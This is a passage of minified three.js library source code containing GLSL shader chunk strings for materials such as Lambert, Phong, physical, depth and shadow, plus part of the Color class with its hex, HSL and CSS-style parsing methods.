saturate(a) clamp( a, 0.0, 1.0 )\\nuniform float toneMappingExposure;\\nuniform float toneMappingWhitePoint;\\nvec3 LinearToneMapping( vec3 color ) {\\n\\treturn toneMappingExposure * color;\\n}\\nvec3 ReinhardToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\treturn saturate( color / ( vec3( 1.0 ) + color ) );\\n}\\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\\nvec3 Uncharted2ToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\treturn saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\\n}\\nvec3 OptimizedCineonToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\tcolor = max( vec3( 0.0 ), color - 0.004 );\\n\\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\\n}\\n\",\nuv_pars_fragment:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n#endif\",uv_pars_vertex:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n\\tuniform vec4 offsetRepeat;\\n#endif\\n\",\nuv_vertex:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvUv = uv * offsetRepeat.zw + offsetRepeat.xy;\\n#endif\",uv2_pars_fragment:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvarying vec2 vUv2;\\n#endif\",uv2_pars_vertex:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tattribute vec2 uv2;\\n\\tvarying vec2 vUv2;\\n#endif\",\nuv2_vertex:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvUv2 = uv2;\\n#endif\",worldpos_vertex:\"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( PHYSICAL ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\\n\\t#ifdef USE_SKINNING\\n\\t\\tvec4 worldPosition = modelMatrix * skinned;\\n\\t#else\\n\\t\\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\\n\\t#endif\\n#endif\\n\",cube_frag:\"uniform samplerCube tCube;\\nuniform float tFlip;\\nuniform float opacity;\\nvarying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tgl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );\\n\\tgl_FragColor.a *= opacity;\\n}\\n\",\ncube_vert:\"varying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n}\\n\",depth_frag:\"#if DEPTH_PACKING == 3200\\n\\tuniform float opacity;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tdiffuseColor.a = opacity;\\n\\t#endif\\n\\t#include <map_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <logdepthbuf_fragment>\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tgl_FragColor = vec4( vec3( gl_FragCoord.z ), opacity );\\n\\t#elif DEPTH_PACKING == 3201\\n\\t\\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\\n\\t#endif\\n}\\n\",\ndepth_vert:\"#include <common>\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\",\ndistanceRGBA_frag:\"uniform vec3 lightPos;\\nvarying vec4 vWorldPosition;\\n#include <common>\\n#include <packing>\\n#include <clipping_planes_pars_fragment>\\nvoid main () {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = packDepthToRGBA( length( vWorldPosition.xyz - lightPos.xyz ) / 1000.0 );\\n}\\n\",distanceRGBA_vert:\"varying vec4 vWorldPosition;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvWorldPosition = worldPosition;\\n}\\n\",\nequirect_frag:\"uniform sampler2D tEquirect;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tvec3 direction = normalize( vWorldPosition );\\n\\tvec2 sampleUV;\\n\\tsampleUV.y = saturate( tFlip * direction.y * -0.5 + 0.5 );\\n\\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\\n\\tgl_FragColor = texture2D( tEquirect, sampleUV );\\n}\\n\",equirect_vert:\"varying vec3 vWorldPosition;\\n#include <common>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n}\\n\",\nlinedashed_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\nuniform float dashSize;\\nuniform float totalSize;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\\n\\t\\tdiscard;\\n\\t}\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <color_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nlinedashed_vert:\"uniform float scale;\\nattribute float lineDistance;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\tvLineDistance = scale * lineDistance;\\n\\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshbasic_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\treflectedLight.indirectDiffuse += texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t#else\\n\\t\\treflectedLight.indirectDiffuse += vec3( 1.0 );\\n\\t#endif\\n\\t#include <aomap_fragment>\\n\\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\\n\\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshbasic_vert:\"#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#ifdef USE_ENVMAP\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#endif\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshlambert_frag:\"uniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float opacity;\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <emissivemap_fragment>\\n\\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\\n\\t#include <lightmap_fragment>\\n\\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\\n\\t#ifdef DOUBLE_SIDED\\n\\t\\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\\n\\t#else\\n\\t\\treflectedLight.directDiffuse = vLightFront;\\n\\t#endif\\n\\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshlambert_vert:\"#define LAMBERT\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <lights_lambert_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshphong_frag:\"#define PHONG\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform vec3 specular;\\nuniform float shininess;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <gradientmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <lights_phong_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_phong_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshphong_vert:\"#define PHONG\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nmeshphysical_frag:\"#define PHYSICAL\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float roughness;\\nuniform float metalness;\\nuniform float opacity;\\n#ifndef STANDARD\\n\\tuniform float clearCoat;\\n\\tuniform float clearCoatRoughness;\\n#endif\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <cube_uv_reflection_fragment>\\n#include <lights_pars>\\n#include <lights_physical_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <roughnessmap_pars_fragment>\\n#include <metalnessmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <roughnessmap_fragment>\\n\\t#include <metalnessmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_physical_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\nmeshphysical_vert:\"#define PHYSICAL\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nnormal_frag:\"#define NORMAL\\nuniform float opacity;\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\nvoid main() {\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\\n}\\n\",\nnormal_vert:\"#define NORMAL\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n}\\n\",\npoints_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <map_particle_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_particle_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphatest_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\npoints_vert:\"uniform float size;\\nuniform float scale;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#ifdef USE_SIZEATTENUATION\\n\\t\\tgl_PointSize = size * ( scale / - mvPosition.z );\\n\\t#else\\n\\t\\tgl_PointSize = size;\\n\\t#endif\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nshadow_frag:\"uniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\nvoid main() {\\n\\tgl_FragColor = vec4( 0.0, 0.0, 0.0, opacity * ( 1.0 - getShadowMask() ) );\\n}\\n\",shadow_vert:\"#include <shadowmap_pars_vertex>\\nvoid main() {\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\"};J.prototype={constructor:J,\nisColor:!0,r:1,g:1,b:1,set:function(a){a&&a.isColor?this.copy(a):\"number\"===typeof a?this.setHex(a):\"string\"===typeof a&&this.setStyle(a);return this},setScalar:function(a){this.b=this.g=this.r=a;return this},setHex:function(a){a=Math.floor(a);this.r=(a>>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(){function a(a,c,d){0>d&&(d+=1);1<d&&--d;return d<1/6?a+6*(c-a)*d:.5>d?c:d<2/3?a+6*(c-a)*(2/3-d):a}return function(b,\nc,d){b=N.euclideanModulo(b,1);c=N.clamp(c,0,1);d=N.clamp(d,0,1);0===c?this.r=this.g=this.b=d:(c=.5>=d?d*(1+c):d+c-d*c,d=2*d-c,this.r=a(d,c,b+1/3),this.g=a(d,c,b),this.b=a(d,c,b-1/3));return this}}(),setStyle:function(a){function b(b){void 0!==b&&1>parseFloat(b)&&console.warn(\"THREE.Color: Alpha component of \"+a+\" will be ignored.\")}var c;if(c=/^((?:rgb|hsl)a?)\\(\\s*([^\\)]*)\\)/.exec(a)){var d=c[2];switch(c[1]){case \"rgb\":case \"rgba\":if(c=/^(\\d+)\\s*,\\s*(\\d+)\\s*,\\s*(\\d+)\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=\nMath.min(255,parseInt(c[1],10))/255,this.g=Math.min(255,parseInt(c[2],10))/255,this.b=Math.min(255,parseInt(c[3],10))/255,b(c[5]),this;if(c=/^(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(100,parseInt(c[1],10))/100,this.g=Math.min(100,parseInt(c[2],10))/100,this.b=Math.min(100,parseInt(c[3],10))/100,b(c[5]),this;break;case \"hsl\":case \"hsla\":if(c=/^([0-9]*\\.?[0-9]+)\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d)){var d=parseFloat(c[1])/\n360,e=parseInt(c[2],10)/100,f=parseInt(c[3],10)/100;b(c[5]);return this.setHSL(d,e,f)}}}else if(c=/^\\#([A-Fa-f0-9]+)$/.exec(a)){c=c[1];d=c.length;if(3===d)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===d)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}a&&0<a.length&&(c=Wf[a],void 0!==\nc?this.setHex(c):console.warn(\"THREE.Color: Unknown color \"+a));return this},clone:function(){return new this.constructor(this.r,this.g,this.b)},copy:function(a){this.r=a.r;this.g=a.g;this.b=a.b;return this},copyGammaToLinear:function(a,b){void 0===b&&(b=2);this.r=Math.pow(a.r,b);this.g=Math.pow(a.g,b);this.b=Math.pow(a.b,b);return this},copyLinearToGamma:function(a,b){void 0===b&&(b=2);var c=0<b?1/b:1;this.r=Math.pow(a.r,c);this.g=Math.pow(a.g,c);this.b=Math.pow(a.b,c);return this},convertGammaToLinear:function(){var a=\nthis.r,b=this.g,c=this.b;this.r=a*a;this.g=b*b;this.b=c*c;return this},convertLinearToGamma:function(){this.r=Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return this},getHex:function(){return 